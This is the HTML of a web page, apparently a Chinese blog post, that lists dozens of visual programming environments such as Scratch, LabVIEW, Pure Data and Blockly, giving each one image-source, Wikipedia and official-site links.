<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-57" href="#Simulink" title="Simulink">Simulink</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-58" href="#Sikuli" title="Sikuli">Sikuli</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-59" href="#SQL_Server_Integration_Services" title="SQL Server Integration Services">SQL Server Integration Services</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-60" href="#Story_Code" title="Story Code">Story Code</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-61" href="#TextIt" title="TextIt">TextIt</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-62" href="#Touch_Develop" title="Touch Develop">Touch Develop</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-63" href="#Tydlig" title="Tydlig">Tydlig</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-64" href="#UDK" title="UDK">UDK</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-65" href="#Visual_JForex" title="Visual JForex">Visual JForex</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-66" href="#VUO" title="VUO">VUO</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-67" href="#VVVV" title="VVVV">VVVV</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-68" href="#Windows_Workflow_Foundation" title="Windows Workflow Foundation">Windows Workflow Foundation</a></li>
</ul></nav>
</div>
<h4 id="sketchpad">
<span class="ez-toc-section" id="SketchPad"></span>SketchPad<span class="ez-toc-section-end"></span>
</h4>
<p>Maybe the first. 1963.</p>
<p><a href="https://mydiesel22.blogspot.com/2011/05/vector-and-digital-graphics.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Sketchpad">Wikipedia</a> 和 <a href="https://www.youtube.com/watch?v=495nCzxM9PI&amp;feature=player_embedded">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p><span id="more-11094"></span></p>
<h4 id="alice">
<span class="ez-toc-section" id="Alice"></span>Alice<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.alice.org/index.php">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Alice_%28software%29">Wikipedia</a> 和 <a href="https://en.wikipedia.org/wiki/File:Alice-2-screenshot.jpg">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="app_inventor_for_android">
<span class="ez-toc-section" id="App_Inventor_For_Android"></span>App Inventor For Android<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://beta.appinventor.mit.edu/learn/tutorials/whereismycar/whereismycar.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/App_Inventor_for_Android">Wikipedia</a> 和 <a href="http://appinventor.mit.edu/explore/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="arcgis_model_builder">
<span class="ez-toc-section" id="ArcGIS_Model_Builder"></span>ArcGIS Model Builder<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.rockware.com/product/featuresLobby.php?id=193&amp;category=615">图片来源</a> 和 <a href="https://resources.arcgis.com/en/help/main/10.1/index.html#//002w00000001000000">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="automator">
<span class="ez-toc-section" id="Automator"></span>Automator<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.apple.com/remotedesktop/automation.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Automator_%28software%29">Wikipedia</a> 和 <a href="https://www.apple.com/osx/apps/#automator">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="blockly">
<span class="ez-toc-section" id="Blockly"></span>Blockly<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://i.imgur.com/PfJO2.png">图片来源</a> 和 <a href="https://code.google.com/p/blockly/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="bounce">
<span class="ez-toc-section" id="Bounce"></span>Bounce<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.art.net/~hopkins/Don/lang/bounce/SpaceSeedCircuits.gif">图片来源</a> 和 <a href="http://www.art.net/~hopkins/Don/lang/bounce/bounce.html">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="copper_thoughts">
<span class="ez-toc-section" id="Copper_Thoughts"></span>Copper Thoughts<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.copperthoughts.com/assets/request-fsm-instance.png">图片来源</a> 和 <a href="http://www.copperthoughts.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="drakon">
<span class="ez-toc-section" id="DRAKON"></span>DRAKON<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/DRAKON">图片来源</a>, <a href="https://en.wikipedia.org/wiki/DRAKON">Wikipedia</a> 和 <a href="http://drakon-editor.sourceforge.net/">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="etoys__squeak">
<span class="ez-toc-section" id="Etoys_Squeak"></span>Etoys / Squeak<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/File:Squeak-screenshot.png">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Etoys_%28programming_language%29">Wikipedia</a> 和 <a href="http://www.squeakland.org/">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="field">
<span class="ez-toc-section" id="Field"></span>Field<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://openendedgroup.com/field/OverviewBanners2.html">图片来源</a> 和 <a href="http://openendedgroup.com/field/">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="fl_studio">
<span class="ez-toc-section" id="FL_Studio"></span>FL Studio<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://freaksolid.wordpress.com/2013/05/20/fl-studio-11-patcher-dj-performance-presets/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Fl_studio">Wikipedia</a> 和 <a href="https://www.image-line.com/flstudio/">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="flow_hub_and_noflo">
<span class="ez-toc-section" id="Flow_Hub_and_NoFlo"></span>Flow Hub and NoFlo<span class="ez-toc-section-end"></span>
</h4>
<p>Flow-Based Programming.</p>
<p><a href="http://flowhub.io/">图片来源 1</a>, <a href="http://cdn.thegrid.io.s3.amazonaws.com/noflo/kickstarter/images/UI-03.jpg">图片来源 2</a> <a href="http://noflojs.org/">官方网站 1</a> 和 <a href="http://flowhub.io/">官方网站 2</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="flowstone">
<span class="ez-toc-section" id="FlowStone"></span>FlowStone<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/File:FlowStone_Large_Screenshot.png">图片来源</a> 和 <a href="http://www.dsprobotics.com/flowstone.html">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="godot_engine">
<span class="ez-toc-section" id="GoDot_Engine"></span>GoDot Engine<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.godotengine.org/wp/wp-content/uploads/2014/01/editor2.jpg">图片来源</a> 和 <a href="https://www.godotengine.org/wp/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="google_web_designer">
<span class="ez-toc-section" id="Google_Web_Designer"></span>Google Web Designer<span class="ez-toc-section-end"></span>
</h4>
<p><a>图片来源</a>, <a href="https://en.wikipedia.org/wiki/Google_Web_Designer">Wikipedia</a> 和 <a href="https://www.google.com/webdesigner/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="hopscotch">
<span class="ez-toc-section" id="Hopscotch"></span>Hopscotch<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.gethopscotch.com/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Hopscotch_%28programming_language%29">Wikipedia</a> 和 <a href="https://www.gethopscotch.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="hypercard">
<span class="ez-toc-section" id="HyperCard"></span>HyperCard<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.smackerel.net/black_white_02.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/HyperCard">Wikipedia</a> 和 <a href="http://hypercard.org/">官方网站???</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="ifttt">
<span class="ez-toc-section" id="IFTTT"></span>IFTTT<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://ifttt.com/recipes">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Ifttt">Wikipedia</a> 和 <a href="https://ifttt.com/wtf">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="illumination_software_creator">
<span class="ez-toc-section" id="Illumination_Software_Creator"></span>Illumination Software Creator<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://lunduke.com/2010/06/16/illumination-software-creator-20-beta-2/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Illumination_Software_Creator">Wikipedia</a> 和 <a href="http://lunduke.com/2010/06/16/illumination-software-creator-20-beta-2/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="intentional_technology">
<span class="ez-toc-section" id="Intentional_Technology"></span>Intentional Technology<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.intentsoft.com/intentional-technology/">图片来源</a> 和 <a href="http://www.intentsoft.com/intentional-technology/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="jeskola_buzz">
<span class="ez-toc-section" id="Jeskola_Buzz"></span>Jeskola Buzz<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://blog.livedoor.jp/acid808/archives/cat_693944.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Jeskola_Buzz">Wikipedia</a> 和 <a href="http://www.jeskola.net/buzz/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="kimono">
<span class="ez-toc-section" id="Kimono"></span>Kimono<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.kimonolabs.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="kodu_boku">
<span class="ez-toc-section" id="Kodu_Boku"></span>Kodu (Boku)<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.interactiveclassroom.net/?p=508">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Kodu">Wikipedia</a> 和 <a href="http://research.microsoft.com/en-us/projects/kodu/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="labview">
<span class="ez-toc-section" id="LabView"></span>LabView<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.ni.com/newsletter/51735/en/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/LabVIEW">Wikipedia</a> 和 <a href="http://www.ni.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="ladder_logic">
<span class="ez-toc-section" id="Ladder_Logic"></span>Ladder Logic<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/Ladder_logic">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Ladder_logic">Wikipedia</a> 和 <a>官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="lamdu">
<span class="ez-toc-section" id="Lamdu"></span>Lamdu<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://peaker.github.io/lamdu/">图片来源</a> 和 <a href="https://peaker.github.io/lamdu/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="lava">
<span class="ez-toc-section" id="Lava"></span>Lava<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://lavape.sourceforge.net/Derivation.htm">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Lava_%28programming_language%29">Wikipedia</a> 和 <a href="http://lavape.sourceforge.net/">官方网站</a></p>
<p style="text-align: center;"><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="learnable_programming">
<span class="ez-toc-section" id="Learnable_Programming"></span>Learnable Programming<span class="ez-toc-section-end"></span>
</h4>
<p>More of a post on different ways to learn programming.</p>
<p><a href="http://worrydream.com/#!/LearnableProgramming">图片来源</a> 和 <a href="http://worrydream.com/#!/LearnableProgramming">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="light_table">
<span class="ez-toc-section" id="Light_Table"></span>Light Table<span class="ez-toc-section-end"></span>
</h4>
<p>Chris Granger’s development environment. <a href="https://plus.google.com/+JJoeDouglas/posts">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Light_table_%28software%29">Wikipedia</a> 和 <a href="http://www.lighttable.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="lily">
<span class="ez-toc-section" id="Lily"></span>Lily<span class="ez-toc-section-end"></span>
</h4>
<p>Really cool and hard to describe. You need to visit their demo web page and watch their videos. <a href="http://blog.lilyapp.org/lily/demo/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Lily_%28software%29">Wikipedia</a> 和 <a href="http://blog.lilyapp.org/lily/demo/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="limnor_studio">
<span class="ez-toc-section" id="Limnor_Studio"></span>Limnor Studio<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.limnor.com/studio_whatIsIt.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Limnor">Wikipedia</a> 和 <a href="http://www.limnor.com/studio_whatIsIt.html">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="little_big_planet">
<span class="ez-toc-section" id="Little_Big_Planet"></span>Little Big Planet<span class="ez-toc-section-end"></span>
</h4>
<p>Someone built an An <a href="https://www.youtube.com/watch?v=jWanvKdurU0">8-bit Mechanical Adder in LittleBigPlanet</a></p>
<p><a href="https://www.youtube.com/watch?v=jWanvKdurU0">图片来源</a>, <a href="https://en.wikipedia.org/wiki/LittleBigPlanet">Wikipedia</a> 和 <a href="http://littlebigplanet.playstation.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="minecraft">
<span class="ez-toc-section" id="Minecraft"></span>Minecraft<span class="ez-toc-section-end"></span>
</h4>
<p>Considering someone has created a <a href="https://www.youtube.com/watch?v=frcr9XYeTW4">fully programmable computer</a> using Minecraft.</p>
<p><a href="https://www.youtube.com/watch?v=frcr9XYeTW4">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Minecraft">Wikipedia</a> 和 <a href="https://minecraft.net/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="minibloq">
<span class="ez-toc-section" id="Minibloq"></span>Minibloq<span class="ez-toc-section-end"></span>
</h4>
<p>This has a really cool looking interface. <a href="https://en.wikipedia.org/wiki/File:ToneWithVariables.png">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Minibloq">Wikipedia</a> 和 <a href="http://blog.minibloq.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="morphic">
<span class="ez-toc-section" id="Morphic"></span>Morphic<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.cc.gatech.edu/fac/mark.guzdial/squeak/startingmorphic.html">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Morphic_%28software%29">Wikipedia</a> 和 <a href="http://www.dmoz.org/Computers/Software/Operating_Systems/Graphic_Subsystems/Morphic">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="mozilla_appmaker">
<span class="ez-toc-section" id="Mozilla_Appmaker"></span>Mozilla Appmaker<span class="ez-toc-section-end"></span>
</h4>
<p>This was discussed quite a bit on <a href="https://news.ycombinator.com/item?id=6501731">Ycombinator</a>. <a href="https://2.bp.blogspot.com/-1xD81b5fPso/Uly-amqf9vI/AAAAAAAAC8I/n7ehLipb1CE/s1600/appmaker.png">图片来源</a> 和 <a href="https://appmaker.mozillalabs.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="mst_workshop">
<span class="ez-toc-section" id="MST_Workshop"></span>MST Workshop<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://home.comcast.net/~tpandolfi/site/?/photos/&amp;PHPSESSID=63621f2035fe55537d794ab0ac795934">图片来源</a>, <a href="https://en.wikipedia.org/wiki/MST_Workshop">Wikipedia</a> 和 <a href="http://home.comcast.net/~tpandolfi/site/?/home/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="neattools_visual_programming_environment">
<span class="ez-toc-section" id="NeatTools_Visual_Programming_Environment"></span>NeatTools Visual Programming Environment<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.sensyr.com/NeatTools.html">图片来源</a> 和 <a href="http://www.neattools.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="nodebox">
<span class="ez-toc-section" id="NodeBox"></span>NodeBox<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://nodebox.net/node/">图片来源</a> 和 <a href="http://nodebox.net/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="nuke">
<span class="ez-toc-section" id="Nuke"></span>Nuke<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.thefoundry.co.uk/products/nuke-product-family/nuke/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Nuke_%28software%29">Wikipedia</a> 和 <a href="https://www.thefoundry.co.uk/products/nuke-product-family/nuke/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="nxtg">
<span class="ez-toc-section" id="NXT-G"></span>NXT-G<span class="ez-toc-section-end"></span>
</h4>
<p>Legos!!! <a href="http://www.brickshelf.com/cgi-bin/gallery.cgi?i=2051945">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Lego_Mindstorms_NXT#NXT-G">Wikipedia</a> 和 <a href="http://www.legoengineering.com/program/nxt-g/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="open_modelica">
<span class="ez-toc-section" id="Open_Modelica"></span>Open Modelica<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.marekgayer.com/en/projects/incfd/">图片来源</a> 和 <a href="https://www.openmodelica.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="open_music">
<span class="ez-toc-section" id="Open_Music"></span>Open Music<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/File:Om_patch.gif">图片来源</a>, <a href="https://en.wikipedia.org/wiki/OpenMusic">Wikipedia</a> 和 <a href="http://repmus.ircam.fr/openmusic/home">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="openwire">
<span class="ez-toc-section" id="OpenWire"></span>OpenWire<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.mitov.com/products/openwire#screenshots">图片来源</a>, <a href="https://en.wikipedia.org/wiki/OpenWire_%28library%29">Wikipedia</a> 和 <a href="http://www.mitov.com/products/openwire#overview">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="origami">
<span class="ez-toc-section" id="Origami"></span>Origami<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://a.36krcnd.com/photo/2014/d2878df00bea4bfb782037f1683423e3.jpg">图片来源</a> 和 <a href="https://facebook.github.io/origami/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="piet">
<span class="ez-toc-section" id="Piet"></span>Piet<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/Piet_%28programming_language%29#Piet">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Piet_%28programming_language%29#Piet">Wikipedia</a> 和 <a href="http://www.retas.de/thomas/computer/programs/useless/piet/Piet/index.html">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="programming_without_coding_technology">
<span class="ez-toc-section" id="Programming_Without_Coding_Technology"></span>Programming Without Coding Technology<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://sourceforge.net/projects/doublesvsoop/?source=recommended">图片来源</a> 和 <a href="http://doublesvsoop.sourceforge.net/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="prograph">
<span class="ez-toc-section" id="Prograph"></span>Prograph<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/File:Prograph_database_operation.PNG">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Prograph">Wikipedia</a> 和 <a href="http://c2.com/cgi/wiki?PrographLanguage">官方网站??</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="pure_data">
<span class="ez-toc-section" id="Pure_Data"></span>Pure Data<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/File:Pd_example_3.svg">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Pure_Data">Wikipedia</a> 和 <a href="http://puredata.info/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="quartz_composer">
<span class="ez-toc-section" id="Quartz_Composer"></span>Quartz Composer<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://mastersofmedia.hum.uva.nl/2011/10/24/finally-it-comes-together/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Quartz_Composer">Wikipedia</a> 和 <a href="https://developer.apple.com/technologies/mac/graphics-and-animation.html">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="reaktor">
<span class="ez-toc-section" id="Reaktor"></span>Reaktor<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://media.soundonsound.com/sos/oct99/images/reaktor5.gif">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Reaktor">Wikipedia</a> 和 <a href="http://www.native-instruments.com/en/products/komplete/synths-samplers/reaktor-5/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="scheme_bricks">
<span class="ez-toc-section" id="Scheme_Bricks"></span>Scheme Bricks<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.pawfal.org/dave/blog/2010/05/scheme-bricks-for-graphics/">图片来源</a> 和 <a href="http://www.pawfal.org/dave/index.cgi?Projects/Scheme%20Bricks">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="scratch">
<span class="ez-toc-section" id="Scratch"></span>Scratch<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://scratch.mit.edu/projects/11126006/#editor">图片来源 1</a>, <a href="https://scratch.mit.edu/projects/11126006/#editor">图片来源 2</a>, <a href="https://en.wikipedia.org/wiki/Scratch_%28programming_language%29">Wikipedia</a> 和 <a href="https://scratch.mit.edu/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="self">
<span class="ez-toc-section" id="Self"></span>Self<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://handbook.selflanguage.org/current/langref.html#objects">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Self_%28programming_language%29">Wikipedia</a> 和 <a href="http://selflanguage.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="sextante">
<span class="ez-toc-section" id="Sextante"></span>Sextante<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.gvsig.com/files/images/screenshots/gvSIG_Sextante_02.png">图片来源</a> 和 <a href="http://sextantegis.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="simulink">
<span class="ez-toc-section" id="Simulink"></span>Simulink<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.mathworks.com/products/simulink/?s_cid=wiki_simulink_8">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Simulink">Wikipedia</a> 和 <a href="https://www.mathworks.com/products/simulink/?s_cid=wiki_simulink_8">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="sikuli">
<span class="ez-toc-section" id="Sikuli"></span>Sikuli<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://hellotestworld.com/2012/04/27/sikuli-for-all-those-hard-to-reach-places/">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Sikuli">Wikipedia</a> 和 <a href="http://www.sikuli.org">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="sql_server_integration_services">
<span class="ez-toc-section" id="SQL_Server_Integration_Services"></span>SQL Server Integration Services<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://technet.microsoft.com/en-us/library/cc917721.aspx">图片来源</a>, <a href="https://en.wikipedia.org/wiki/SQL_Server_Integration_Services">Wikipedia</a> 和 <a href="https://www.microsoft.com/en-us/sqlserver/solutions-technologies/enterprise-information-management/integration-services.aspx">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="story_code">
<span class="ez-toc-section" id="Story_Code"></span>Story Code<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://softconstructors.com/en/applications/stroycode/screenshots.html">图片来源</a> 和 <a href="http://softconstructors.com/en/applications/stroycode/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="textit">
<span class="ez-toc-section" id="TextIt"></span>TextIt<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://textit.in/">图片来源</a> 和 <a href="https://textit.in/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="touch_develop">
<span class="ez-toc-section" id="Touch_Develop"></span>Touch Develop<span class="ez-toc-section-end"></span>
</h4>
<p>From Microsoft research.</p>
<p><a href="http://handheld.softpedia.com/progScreenshots/TouchDevelop-Screenshot-125731.html">图片来源</a> 和 <a href="https://www.touchdevelop.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="tydlig">
<span class="ez-toc-section" id="Tydlig"></span>Tydlig<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://tydligapp.com/images/screenshots/1-physics.png">图片来源</a> 和 <a href="http://tydligapp.com/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="udk">
<span class="ez-toc-section" id="UDK"></span>UDK<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.youtube.com/watch?v=0OR63rDN5p8">图片来源</a> 和 <a href="https://www.unrealengine.com/en/udk/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="visual_jforex">
<span class="ez-toc-section" id="Visual_JForex"></span>Visual JForex<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://i1.ytimg.com/vi/iz5numHchGU/maxresdefault.jpg">图片来源</a> 和 <a href="http://www.dukascopy.com/swiss/english/forex/Visual/features/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="vuo">
<span class="ez-toc-section" id="VUO"></span>VUO<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.vjunion.se/2013/03/a-great-start-to-the-new-year/">图片来源</a> 和 <a href="http://vuo.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="vvvv">
<span class="ez-toc-section" id="VVVV"></span>VVVV<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://vvvv.org/contribution/vvvv.packs.image">图片来源 1</a>, <a href="http://kristiansmusicproductionblog.com/wp-content/uploads/vvvv.png">图片来源 2</a>, <a href="https://en.wikipedia.org/wiki/Vvvv">Wikipedia</a> 和 <a href="http://www.vvvv.org/">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<h4 id="windows_workflow_foundation">
<span class="ez-toc-section" id="Windows_Workflow_Foundation"></span>Windows Workflow Foundation<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://fryerblog.com/post/2179029238/a-windows-workflow-foundation-example">图片来源</a>, <a href="https://en.wikipedia.org/wiki/Windows_Workflow_Foundation">Wikipedia</a> 和 <a href="https://msdn.microsoft.com/en-us/vstudio/jj684582.aspx">官方网站</a></p>
<p><img alt="image placeholder" ><img alt="image placeholder" ></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
